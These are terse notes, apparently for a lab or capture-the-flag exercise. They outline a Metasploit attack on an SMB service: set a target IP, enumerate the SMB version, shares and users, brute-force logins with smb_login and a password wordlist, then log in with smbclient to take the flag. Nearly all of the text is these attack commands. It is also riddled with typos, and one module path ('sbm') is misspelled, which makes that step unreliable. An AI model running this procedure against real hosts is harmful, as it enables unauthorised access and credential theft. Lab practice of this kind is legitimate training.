START POSTGRESQL 

MSFCONSOLE

NEW WORKSPACE


SET RHOSTS "TAGRTIP" GOBALLY 
```
setg RHOSTS 192.11.144.67
```

now search auxiliary for smb

```
search type:auxiliary name:smb
```
checj version
```
use auxiliary/scanner/sbm/smb_version
```

then check smb version is exploitabl;e or not

enum shares
```
use auxiliary/scanner/smb/smb_enumshares
```
enum users
```
use auxiliary/scanner/smb/smb_enumusers
```

then use valid usernames for brute force

brute force
```
use auxiliary/scanner/smb/smb_login
```

```
set SMBuser admin or valid_username
```

```
set PASS_FILE /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt
```

then use get valid creds.

use "SMBCLIENT" tool to login.

enumerate and get flag.

